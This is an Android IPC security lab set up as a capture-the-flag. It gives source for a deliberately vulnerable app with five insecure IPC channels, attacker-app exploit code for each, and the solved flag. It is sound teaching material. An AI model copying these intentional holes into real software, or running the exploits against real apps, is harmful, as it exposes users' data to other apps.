# Lab 05 — CTF: Five Doors

**Difficulty:** Advanced
**Time:** 4–6 hours
**Prerequisites:** Labs [01](lab-01-map-the-ipc-surface.md), [02](lab-02-abstract-socket.md),
[03](lab-03-confused-deputy.md), [04](lab-04-localhost-service.md); all of
[Chapter 24 §3](../README.md#3-deep-internal-working)

---

## The challenge

One APK. One flag, split into five fragments.

Each fragment sits behind a **different IPC mechanism**, and the five mechanisms are deliberately
chosen so that no single tool and no single technique finds more than one or two of them. A
manifest-driven scanner finds two. A `dumpsys` sweep finds two and a half. Only a complete
surface enumeration — mediated *and* direct — finds all five.

```
IPCLAB{fragment1_fragment2_fragment3_fragment4_fragment5}
```

**Recover all five fragments and assemble the flag.**

## Objective

Apply the seven-step methodology from [§3.22](../README.md#322-a-full-methodology-for-enumerating-an-apps-ipc-surface)
end to end against a single target, under a constraint that makes shortcuts impossible: **every
fragment must be recovered from an ordinary, unprivileged application.**

## Why this matters

The rule below is the entire point of the lab, and it is not an artificial handicap.

`adb shell` runs as UID 2000 in the SELinux domain `shell`, and holds privileges no installed app
has. On a real engagement, a fragment you retrieved with `am`, `content` or `curl` from the shell
proves the mechanism works — and proves nothing about whether an attacker can use it. Half of all
rejected Android IPC findings are rejected for exactly that reason.

By forcing every solution through an attacker APK, this CTF makes you *feel* the difference rather
than read about it. Two of the five doors behave differently from the shell than from an app, and
finding out which two is more educational than the flag.

---

## Rules

1. **No root.** Not for enumeration, not for reading files, not for anything.
2. **Every fragment must be retrieved by code running in an ordinary app process.** You may use
   `adb shell` to *find* things — `/proc/net/unix`, `/proc/net/tcp`, `dumpsys package` are all fair —
   but the retrieval itself must happen from an APK you installed, or from Drozer's agent, which is
   also an ordinary app.
3. **No decompiling your way to the literal.** The fragments are assembled at runtime and are not
   contiguous string constants. If you find one whole in `strings`, you have found a decoy.
4. **No patching the target.** No repackaging, no Frida hooks that read the fields. You may
   use Frida to *observe* (that is legitimate reconnaissance) but not to short-circuit a door.
5. For each door you must be able to state: the mechanism, what protects it (or what does not), the
   identity you used, and the one-line fix.

---

## Setup — building the target

Build it yourself. Implementing the five doors is at least half the education, and you cannot rate a
severity honestly for a mechanism you have never written.

Package: `com.iplab.fivedoors`. Everything below goes in one app.

### The flag store

```java
package com.iplab.fivedoors;

/** Fragments are assembled at runtime so no single literal exists in the DEX. */
public final class Flag {
    private static String join(String... p) {
        StringBuilder sb = new StringBuilder();
        for (String s : p) sb.append(s);
        return sb.toString();
    }
    // Door 1 — exported ContentProvider
    static String one()   { return join("IPCLAB", String.valueOf((char) 0x7B), "provider"); }
    // Door 2 — exported bound service, unguarded transaction
    static String two()   { return join("no", "_", "doorman"); }
    // Door 3 — abstract-namespace UNIX socket
    static String three() { return join("no", "_", "mode", "_", "bits"); }
    // Door 4 — localhost HTTP listener
    static String four()  { return join("loopback", "_is_a_", "bus"); }
    // Door 5 — confused deputy / URI grant theft
    static String five()  { return join("deputy", "_", "grants", String.valueOf((char) 0x7D)); }

    // A decoy, present as a whole literal, to punish `strings | grep IPCLAB`.
    static final String DECOY = "IPCLAB{if_you_found_this_in_strings_read_rule_3}";
}
```

### Door 1 — an exported ContentProvider

The obvious one. Every scanner finds it; the fragment is not in the obvious table.

```java
package com.iplab.fivedoors;

import android.content.*;
import android.database.*;
import android.net.Uri;

public class PublicProvider extends ContentProvider {
    @Override public boolean onCreate() { return true; }

    @Override public Cursor query(Uri uri, String[] proj, String sel,
                                  String[] args, String sort) {
        String path = uri.getLastPathSegment();
        if ("notes".equals(path)) {
            MatrixCursor c = new MatrixCursor(new String[]{"_id", "body"});
            c.addRow(new Object[]{1, "shopping list"});
            c.addRow(new Object[]{2, Flag.DECOY});          // decoy lives here
            return c;
        }
        // The real fragment is in a path the UriMatcher accepts but nothing
        // advertises. Enumerate paths; do not assume the first one is all there is.
        if ("internal_config".equals(path)) {
            MatrixCursor c = new MatrixCursor(new String[]{"_id", "key", "value"});
            c.addRow(new Object[]{1, "flag_part_1", Flag.one()});
            return c;
        }
        return null;
    }
    @Override public String getType(Uri u) { return "vnd.android.cursor.dir/x"; }
    @Override public Uri insert(Uri u, ContentValues v) { return null; }
    @Override public int delete(Uri u, String s, String[] a) { return 0; }
    @Override public int update(Uri u, ContentValues v, String s, String[] a) { return 0; }
}
```

```xml
<provider android:name=".PublicProvider"
          android:authorities="com.iplab.fivedoors.public"
          android:exported="true"/>
```

### Door 2 — an exported bound service with an unguarded transaction

```java
package com.iplab.fivedoors;

import android.app.Service;
import android.content.Intent;
import android.os.*;

public class AdminService extends Service {

    static final String DESCRIPTOR = "com.iplab.fivedoors.IAdmin";

    private final Binder binder = new Binder() {
        @Override protected boolean onTransact(int code, Parcel data,
                                               Parcel reply, int flags)
                throws RemoteException {
            switch (code) {
                case 1:                                     // getVersion — harmless
                    data.enforceInterface(DESCRIPTOR);
                    reply.writeNoException();
                    reply.writeString("2.4.1");
                    return true;
                case 2:                                     // ping
                    data.enforceInterface(DESCRIPTOR);
                    reply.writeNoException();
                    reply.writeString("pong");
                    return true;
                case 7:                                     // UNDOCUMENTED
                    // No getCallingUid() check anywhere. Not in any .aidl.
                    data.enforceInterface(DESCRIPTOR);
                    reply.writeNoException();
                    reply.writeString(Flag.two());
                    return true;
                default:
                    return super.onTransact(code, data, reply, flags);
            }
        }
        @Override public String getInterfaceDescriptor() { return DESCRIPTOR; }
    };

    @Override public IBinder onBind(Intent intent) { return binder; }
}
```

```xml
<service android:name=".AdminService" android:exported="true">
    <intent-filter><action android:name="com.iplab.fivedoors.ADMIN"/></intent-filter>
</service>
```

### Door 3 — an abstract-namespace UNIX socket

```java
package com.iplab.fivedoors;

import android.net.*;
import java.io.*;

public class SocketDoor extends Thread {
    static final String NAME = "com.iplab.fivedoors.ctl";   // ABSTRACT by default

    @Override public void run() {
        try {
            LocalServerSocket srv = new LocalServerSocket(NAME);
            while (!isInterrupted()) {
                LocalSocket c = srv.accept();
                BufferedReader r = new BufferedReader(
                        new InputStreamReader(c.getInputStream()));
                String line = r.readLine();
                OutputStream o = c.getOutputStream();
                if ("FLAG".equalsIgnoreCase(String.valueOf(line).trim())) {
                    o.write((Flag.three() + "\n").getBytes("UTF-8"));
                } else {
                    // Deliberately helpful, like a real debug channel.
                    o.write("commands: PING VERSION FLAG\n".getBytes("UTF-8"));
                }
                o.flush();
                c.close();
            }
        } catch (Exception ignored) { }
    }
}
```

Nothing about this appears in the manifest. That is the lesson.

### Door 4 — a localhost HTTP listener

```java
package com.iplab.fivedoors;

import java.io.*;
import java.net.*;

public class HttpDoor extends Thread {
    @Override public void run() {
        try {
            // Loopback only. Ephemeral port — you must FIND it, not guess it.
            ServerSocket ss = new ServerSocket(0, 8,
                    InetAddress.getByName("127.0.0.1"));
            android.util.Log.i("fivedoors", "http door on port " + ss.getLocalPort());
            while (!isInterrupted()) {
                Socket s = ss.accept();
                BufferedReader r = new BufferedReader(
                        new InputStreamReader(s.getInputStream()));
                String req = r.readLine();
                String body = (req != null && req.contains("/status/flag"))
                        ? Flag.four()
                        : "{\"status\":\"ok\",\"routes\":[\"/status\",\"/status/...\"]}";
                PrintWriter w = new PrintWriter(s.getOutputStream());
                w.print("HTTP/1.1 200 OK\r\nContent-Length: " + body.length()
                        + "\r\nConnection: close\r\n\r\n" + body);
                w.flush();
                s.close();
            }
        } catch (Exception ignored) { }
    }
}
```

Add `<uses-permission android:name="android.permission.INTERNET"/>` to the target.

### Door 5 — the confused deputy

```java
package com.iplab.fivedoors;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

/** Exported "router". Forwards whatever Intent it is handed. */
public class RouterActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent next = getIntent().getParcelableExtra("route");
        if (next != null) startActivity(next);
        finish();
    }
}
```

```java
package com.iplab.fivedoors;

import android.content.*;
import android.database.*;
import android.net.Uri;

/** NOT exported. grantUriPermissions is on. */
public class SecretProvider extends ContentProvider {
    @Override public boolean onCreate() { return true; }
    @Override public Cursor query(Uri u, String[] p, String s, String[] a, String o) {
        MatrixCursor c = new MatrixCursor(new String[]{"_id", "fragment"});
        c.addRow(new Object[]{1, Flag.five()});
        return c;
    }
    @Override public String getType(Uri u) { return "vnd.android.cursor.item/x"; }
    @Override public Uri insert(Uri u, ContentValues v) { return null; }
    @Override public int delete(Uri u, String s, String[] a) { return 0; }
    @Override public int update(Uri u, ContentValues v, String s, String[] a) { return 0; }
}
```

```xml
<activity android:name=".RouterActivity" android:exported="true">
    <intent-filter>
        <action android:name="com.iplab.fivedoors.ROUTE"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>

<provider android:name=".SecretProvider"
          android:authorities="com.iplab.fivedoors.secret"
          android:exported="false"
          android:grantUriPermissions="true"/>
```

### Wire it up and install

```java
// MainActivity.onCreate
new SocketDoor().start();
new HttpDoor().start();
```

```bash
# host
gradle assembleDebug
adb install -r fivedoors.apk
adb shell am start -n com.iplab.fivedoors/.MainActivity
```

Leave it running. Three of the five doors do not exist until the app has started.

---

## Your first attempt (which will find one and a half doors)

```bash
# host
apktool d -f fivedoors.apk -o work/ >/dev/null
grep -nE 'exported="true"' work/AndroidManifest.xml
adb shell dumpsys package com.iplab.fivedoors | grep -i exported
strings work/classes.dex | grep IPCLAB
```

**Q1.** How many of the five doors did the manifest reveal? Which two mechanisms are structurally
invisible to it, and why — answer in terms of what a manifest *is*.

**Q2.** `strings` found something. Is it the flag? What does rule 3 tell you, and what does that
imply about how the real fragments are stored?

---

## Steps

### Step 0 — Ground truth

```bash
# host
aapt2 dump badging fivedoors.apk | grep -E "package|targetSdkVersion"
adb shell getprop ro.build.version.sdk
adb shell getprop ro.build.fingerprint
```

Set up your attacker APK from [`../examples/attacker-app/`](../examples/attacker-app/README.md) and
point `<queries>` at the target — **including both provider authorities**. Skip this and every door
will report `ABSENT`.

```xml
<queries>
    <package  android:name="com.iplab.fivedoors" />
    <provider android:authorities="com.iplab.fivedoors.public" />
    <provider android:authorities="com.iplab.fivedoors.secret" />
</queries>
```

### Step 1 — Full surface enumeration

```bash
# host
../scripts/enumerate-ipc-surface.sh com.iplab.fivedoors ./out
python3 ../scripts/ipc-surface-report.py ./out/ipc-surface.txt \
        --manifest work/AndroidManifest.xml --md ./out/report.md
```

**Q3.** How many distinct mechanisms does the report list? Compare against your first attempt. Which
sections of the enumeration output produced the extra ones?

**Q4.** Two of the five doors would still be missing if the app had not been running when you
enumerated. Which two, and why?

### Step 2 — Door 1: the provider

```bash
# adb shell — reconnaissance only
content query --uri content://com.iplab.fivedoors.public/notes
```

Then find the *other* path, and retrieve the fragment **from your attacker app**.

**Q5.** How did you discover a path that nothing advertises? List every technique you tried and say
which worked.

**Q6.** The first table you found contains a decoy. What does the presence of a decoy in the obvious
place tell you about how to treat any provider you enumerate?

### Step 3 — Door 2: the bound service

```bash
# adb shell — reconnaissance
dumpsys package com.iplab.fivedoors | grep -A5 -i adminservice
```

You cannot `bindService` from `adb shell`. This door **must** be opened from an app.

```bash
# host
adb shell am start -n com.attacker.poc/.ProbeActivity \
    --es target com.iplab.fivedoors --es only services
adb logcat -s poc:I
```

**Q7.** The probe sweeps transaction codes 1 to 24. Which codes are handled? Which one is not
mentioned in any `.aidl` and not reachable through any generated proxy?

**Q8.** How would you recover the interface descriptor and the transaction codes from a real,
obfuscated app? Name the two artefacts in the decompiled `Stub` that give you the original `.aidl`.

**Q9.** What single line of code in `onTransact` would have closed this door?

### Step 4 — Door 3: the abstract socket

```bash
# adb shell — reconnaissance
cat /proc/net/unix | grep '@'
```

```bash
# host — confirm it speaks, from a privileged context
python3 ../scripts/abstract-socket-probe.py --via-adb \
        --name com.iplab.fivedoors.ctl --probe-all
```

Then retrieve the fragment from the attacker app.

**Q10.** State precisely what protects this socket. Then state what would protect it if the developer
had used the `FILESYSTEM` namespace inside `getFilesDir()`.

**Q11.** Did the shell-side probe and the app-side probe behave identically on your device? If they
differed, what mechanism explains the difference, and what would you write in a report?

### Step 5 — Door 4: the localhost listener

The port is **ephemeral** — it changes on every launch, so a fixed scan list is not enough.

```bash
# adb shell — reconnaissance
awk 'NR>1 && $4=="0A" {print $2, $8}' /proc/net/tcp
cmd package list packages --uid <uid-from-above>
```

**Q12.** How did you determine which listener belongs to the target rather than to some other app?

**Q13.** Once you have the port, you still need the route. `/status` tells you routes exist but not
what they are. How did you find `/status/flag`? Which of your techniques would still work against an
app whose routes are not hinted at all?

**Q14.** Which permission did the attacker app need for this door, and how does its protection level
compare with the *zero* permissions Door 3 required?

### Step 6 — Door 5: the confused deputy

The `SecretProvider` is `android:exported="false"`. Prove it first:

```bash
# host
adb shell am start -n com.attacker.poc/.ProbeActivity \
    --es target com.iplab.fivedoors --es only providers
```

Then make the target hand you a grant.

**Q15.** Which UID makes the `startActivity` call that carries your grant flags? Which AOSP service
records the granter, and why does `exported="false"` not prevent this?

**Q16.** Your `GrantSink` must be `exported="true"`. Why? What happens if it is not, and how would
that failure look if you did not know to check?

### Step 7 — Assemble and verify

Concatenate the fragments in door order with `_` between them. The result begins `IPCLAB{` and ends
`}`.

**Q17.** Write the five-row table: door, mechanism, what protected it, the identity you used, the
one-line fix.

### Step 8 — Now do the honest part

For each door, write the finding as you would deliver it to a client: mechanism, prerequisite, exact
retrieval method, evidence, severity **with justification**, and the fix as code.

**Q18.** Rank the five doors by severity *as implemented here*. Then rank them again assuming each
one exposed a real session token instead of a flag fragment. Do the rankings differ? What does that
tell you about rating a mechanism versus rating an exposure?

---

## Hints

<details>
<summary>Hint 1 — everything reports ABSENT from the attacker app</summary>

`<queries>`. On API 30+, package visibility filtering makes an undeclared package indistinguishable
from an uninstalled one. Providers need a `<provider android:authorities="…">` entry *in addition to*
the `<package>` entry — declaring the package alone will not resolve a `content://` URI.

Section 0 of the probe's output diagnoses this explicitly. Read it before anything else.
</details>

<details>
<summary>Hint 2 — Door 1: finding the unadvertised path</summary>

Four approaches, roughly in order of speed:

1. Read the provider's `query()` in JADX and look at what it compares `getLastPathSegment()` against.
2. `run app.provider.finduri com.iplab.fivedoors` in Drozer, which harvests URI-shaped strings from
   the DEX.
3. `grep -rn "content://" out/sources/` and `strings classes.dex | grep -i content://`.
4. Guess from a wordlist. The probe app already tries a dozen common names.

Technique 1 is the one that scales; the others are how you get lucky quickly.
</details>

<details>
<summary>Hint 3 — Door 2: how do I call a transaction code by hand?</summary>

```java
IBinder b = /* from onServiceConnected */;
Parcel data = Parcel.obtain(), reply = Parcel.obtain();
try {
    data.writeInterfaceToken(b.getInterfaceDescriptor());
    b.transact(7, data, reply, 0);
    reply.readException();
    Log.i("poc", "code 7 -> " + reply.readString());
} finally { data.recycle(); reply.recycle(); }
```

`enforceInterface` on the far side requires the token, and `getInterfaceDescriptor()` gives it to you
for free. The token is an anti-confusion measure, not a security control — you can write it too.
</details>

<details>
<summary>Hint 4 — Door 3: the socket is not in /proc/net/unix</summary>

The app must be running and past `onCreate`. Launch it, wait, look again. Also grep for `@` alone
rather than for the package name — a socket's abstract name need have nothing to do with its package,
and in real apps it frequently does not.
</details>

<details>
<summary>Hint 5 — Door 4: which listener is the target's?</summary>

The `uid` column of `/proc/net/tcp`, mapped with `cmd package list packages --uid <uid>`. A
before/after diff around launching the target is the fastest way to be certain:

```bash
# adb shell
cat /proc/net/tcp > /data/local/tmp/a
am force-stop com.iplab.fivedoors
cat /proc/net/tcp > /data/local/tmp/b
diff /data/local/tmp/a /data/local/tmp/b
```
</details>

<details>
<summary>Hint 6 — Door 5: the grant arrives but the query is denied</summary>

Check all four:

1. `FLAG_GRANT_READ_URI_PERMISSION` on the **inner** Intent, not the outer one.
2. The provider declares `android:grantUriPermissions="true"`.
3. The URI is under `com.iplab.fivedoors.secret` and has a path segment.
4. Your `GrantSink` is `android:exported="true"` — the *victim*, a different UID, is what starts it.
</details>

<details>
<summary>Hint 7 — I want to cheat with Frida</summary>

Rule 4 says you may observe but not short-circuit. `trace-ipc.js` is legitimate reconnaissance: it
will show you the socket name at construction, the `ServerSocket` bind with its port, the provider
paths as they are queried, and every `onTransact` code with its calling UID. Use it to *find* doors.
Retrieve through them from the attacker APK.
</details>

---

## Solutions

Do not read until you have made a genuine attempt at all five.

<details>
<summary>Door 1 — the exported provider</summary>

`content query --uri content://com.iplab.fivedoors.public/notes` returns the decoy. The real fragment
is under `/internal_config`, which nothing advertises. Find it by reading `query()` in JADX — the
method compares `uri.getLastPathSegment()` against two literals and only one of them appears anywhere
else.

From the attacker app:

```java
Uri u = Uri.parse("content://com.iplab.fivedoors.public/internal_config");
try (Cursor c = getContentResolver().query(u, null, null, null, null)) {
    while (c != null && c.moveToNext()) Log.i("poc", c.getString(2));
}
```

**What protected it:** nothing. `exported="true"` with no read permission.
**Fix:** `android:exported="false"`, or a `signature`-level `android:readPermission`.
</details>

<details>
<summary>Door 2 — the unguarded transaction code</summary>

Bind the service and sweep the codes. Codes 1 and 2 are documented and boring; code 7 is not
mentioned in any `.aidl` and is unreachable through any generated proxy — which is exactly why
reading the `.aidl` is not enough and sweeping the range is.

```java
Intent i = new Intent("com.iplab.fivedoors.ADMIN").setPackage("com.iplab.fivedoors");
bindService(i, new ServiceConnection() {
    public void onServiceConnected(ComponentName n, IBinder b) {
        Parcel d = Parcel.obtain(), r = Parcel.obtain();
        try {
            d.writeInterfaceToken(b.getInterfaceDescriptor());
            b.transact(7, d, r, 0);
            r.readException();
            Log.i("poc", "fragment 2 = " + r.readString());
        } catch (Exception e) { Log.i("poc", "" + e); }
        finally { d.recycle(); r.recycle(); }
    }
    public void onServiceDisconnected(ComponentName n) { }
}, Context.BIND_AUTO_CREATE);
```

**Why `adb shell` cannot do this:** there is no shell command that performs a `bindService` to an app
service. `service call` works against services registered with `servicemanager`, which an app service
is not. This door is only openable from an app — which is precisely the lesson.

**What protected it:** nothing. Exported service, no `android:permission`, no caller check.
**Fix:** one line at the top of the transaction —
`if (Binder.getCallingUidOrThrow() != Process.myUid()) throw new SecurityException();` — plus a
`signature` permission on the service in the manifest.
</details>

<details>
<summary>Door 3 — the abstract socket</summary>

```bash
# adb shell
cat /proc/net/unix | grep '@'
# @com.iplab.fivedoors.ctl
```

From the attacker app, with **zero permissions**:

```java
LocalSocket s = new LocalSocket();
s.connect(new LocalSocketAddress("com.iplab.fivedoors.ctl",
                                 LocalSocketAddress.Namespace.ABSTRACT));
s.getOutputStream().write("FLAG\n".getBytes("UTF-8"));
s.getOutputStream().flush();
byte[] buf = new byte[256];
int n = s.getInputStream().read(buf);
Log.i("poc", "fragment 3 = " + new String(buf, 0, n, "UTF-8").trim());
```

**What protected it:** nothing, in the strongest sense available. There is no inode, no owner, no
group and no mode bits — not even a permission to get wrong — so there is no access control to
misconfigure. Only SELinux stands anywhere near this, and for app-to-app abstract connections it has
historically been permissive.

**Fix:** `LocalSocketAddress.Namespace.FILESYSTEM` with the socket inside `getFilesDir()` — the
directory's 0700 mode then genuinely excludes other apps — plus a `getPeerCredentials()` UID check.
Better: delete the socket and use a non-exported bound service, so the *platform* enforces the
boundary instead of your code.
</details>

<details>
<summary>Door 4 — the localhost listener</summary>

The port is ephemeral, so find it rather than guessing:

```bash
# adb shell
awk 'NR>1 && $4=="0A" {print $2, $8}' /proc/net/tcp
cmd package list packages --uid <uid>
```

Decode the hex: the IP is little-endian, so `0100007F` is `127.0.0.1`; the port is straightforward
big-endian hex. Then from the attacker app, which needs only `INTERNET`:

```java
URL u = new URL("http://127.0.0.1:" + port + "/status/flag");
Log.i("poc", "fragment 4 = " + new BufferedReader(new InputStreamReader(
        ((HttpURLConnection) u.openConnection()).getInputStream())).readLine());
```

The route: `/status` returns a JSON body that mentions `"/status/..."`. Against an app with no hint at
all you would read the request handler in JADX, or fuzz a route wordlist — but reading the code is
what scales.

**What protected it:** only the ephemeral port, which is obscurity, not access control. Any app can
read `/proc/net/tcp` and find the port in milliseconds.
**Fix:** a per-launch high-entropy bearer token checked on every request, plus `Host` validation,
plus no debug routes in the release source set.
</details>

<details>
<summary>Door 5 — the confused deputy</summary>

`SecretProvider` is `exported="false"`, so a direct query is denied. Make the target issue the grant:

```java
Intent inner = new Intent(Intent.ACTION_VIEW);
inner.setClassName("com.attacker.poc", "com.attacker.poc.GrantSink");
inner.setData(Uri.parse("content://com.iplab.fivedoors.secret/fragment/1"));
inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

Intent outer = new Intent("com.iplab.fivedoors.ROUTE");
outer.setClassName("com.iplab.fivedoors", "com.iplab.fivedoors.RouterActivity");
outer.putExtra("route", inner);
outer.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(outer);
```

`GrantSink` then queries the URI it was handed and logs the rows.

**Why it works:** the inner `startActivity` is executed **by the target**, so the transaction carries
the target's UID. `UriGrantsManagerService` evaluates `FLAG_GRANT_READ_URI_PERMISSION` with the
target as the granter, because the target owns the authority — and issues a real, legitimate grant.
Nothing was bypassed. `exported="false"` governs direct access; a URI grant is a separate, per-URI
capability the owner may hand out.

**What protected it:** `exported="false"` protected it from *direct* access and from nothing else.
**Fix:** do not forward a caller-supplied Intent. Accept an enumerated route token and construct the
destination yourself. If forwarding is unavoidable, restrict the destination to an allowlist of your
own components and call `removeFlags` on all four `FLAG_GRANT_*` values, plus `setClipData(null)`.
</details>

<details>
<summary>The assembled flag</summary>

```
IPCLAB{provider_no_doorman_no_mode_bits_loopback_is_a_bus_deputy_grants}
```

Each fragment names the lesson of its door:

| Door | Mechanism | Lesson |
|---|---|---|
| 1 | Exported ContentProvider | `provider` — the obvious door, but not the obvious table |
| 2 | Exported bound service | `no_doorman` — Binder tells you who is calling and then does nothing else |
| 3 | Abstract UNIX socket | `no_mode_bits` — there is not even a permission to get wrong |
| 4 | Localhost HTTP | `loopback_is_a_bus` — not a trust boundary |
| 5 | Intent redirection | `deputy_grants` — the victim exercises its own authority for you |

</details>

---

## Debrief questions

Answer in writing. They are the actual point of the lab.

1. For each door, name the tool category that would have found it and the tool category that would
   have missed it. Which single category of tool missed the most?
2. Two doors cannot be opened from `adb shell` at all. Which two, and what is the mechanism in each
   case? What does that imply about a methodology built on shell commands?
3. Door 4's port was ephemeral. Rate that as a security control, and justify the rating with the
   specific cost it imposes on an attacker.
4. Door 2's transaction code 7 appears in no `.aidl`. Explain how a hand-written `onTransact`
   override creates surface that a generated one does not, and how you would find such codes in an
   app whose source you do not have.
5. Rank the five doors by how likely a developer is to *know* the channel exists. Does that ranking
   correlate with severity? What does the answer suggest about where to spend review effort?
6. You are writing the client report. Which door do you lead with, and why? Which one would you
   deliberately rate lower than the mechanism's reputation suggests?
7. Write the CI check that would have caught each door before release. Which of the five is hardest
   to detect automatically, and why?

---

## Success criteria

- [ ] You recovered all five fragments and assembled the flag
- [ ] Every fragment was retrieved by code running in an **ordinary app process** — none by `adb
      shell`, none by root, none by a Frida hook that read the value directly
- [ ] You identified which two doors are impossible to open from `adb shell`, and can explain why
- [ ] You did not report the decoy
- [ ] For each door you can state the mechanism, what protected it, the identity you used, and the
      one-line fix
- [ ] You produced the five-row summary table
- [ ] You ranked the doors by severity twice — as implemented, and as if each exposed a real token —
      and can explain any difference
- [ ] You answered all seven debrief questions in writing
- [ ] You wrote a CI check for each door
- [ ] You can explain, in one sentence, why a manifest-driven scanner finds at most two of five

---

## Note for instructors

The pedagogical goal is **not** the flag. It is the constraint in rule 2.

Participants reliably solve doors 1 and 5 from `adb shell` first, then discover that doors 2, 3 and 4
force them into an APK — and door 2 forces it absolutely, because no shell command performs a
`bindService` to an app service. That moment, where the shell cannot do the thing, is worth
more than the other five hours combined.

If you are running this as a group exercise:

- Hand out door 1 first and let everyone succeed quickly. Confidence before frustration.
- Do **not** tell them how many doors are invisible in the manifest. Let them report "two exported
  components" and then show them `/proc/net/unix`.
- Insist on the severity re-ranking in Step 8. Participants who rate the abstract socket Critical
  because the mechanism is exciting need to see it rated Low when it returns a version string.
- The best participants will find door 4's port with a before/after diff rather than a scan. Ask them
  to explain the difference to the group; it generalises to every socket in the chapter.
- Anyone who reaches for Frida immediately should be required to also solve it without, and vice
  versa. The comparison is where the learning is.
